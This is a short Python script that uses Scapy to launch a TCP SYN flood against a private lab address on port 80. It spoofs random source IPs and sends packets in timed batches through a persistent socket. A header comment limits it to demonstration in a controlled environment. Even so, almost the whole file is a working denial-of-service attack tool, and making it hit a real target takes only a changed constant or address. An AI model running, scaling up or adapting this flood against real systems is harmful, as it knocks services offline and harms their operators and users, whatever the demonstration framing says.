#caution only for a demonstration use in controlled environment only !!!!!!

from scapy.all import *
import random
import time

TARGET_IP = "192.168.56.103"
TARGET_PORT = 80
PACKET_COUNT = 50  # Adjusted to target 50 packets
BATCH_SIZE = 10    # Packets per batch

print(f"Launching optimized TCP SYN flood attack on {TARGET_IP}:{TARGET_PORT}")

# Create persistent socket (3x faster than default send())
s = conf.L3socket()

# Pre-generate all packets (memory efficient for 50 packets)
packets = [
    IP(src=f"192.168.1.{random.randint(2,254)}", dst=TARGET_IP)
    / TCP(sport=random.randint(1024,65535), dport=TARGET_PORT, flags="S")
    for _ in range(PACKET_COUNT)
]

# Batch sending with timing control
start_time = time.time()
sent = 0
while sent < PACKET_COUNT:
    batch = packets[sent:sent+BATCH_SIZE]
    send(batch, verbose=False, socket=s, inter=0.001)  # 1ms between packets
    sent += BATCH_SIZE

print(f"Attack completed in {time.time()-start_time:.2f} seconds!")
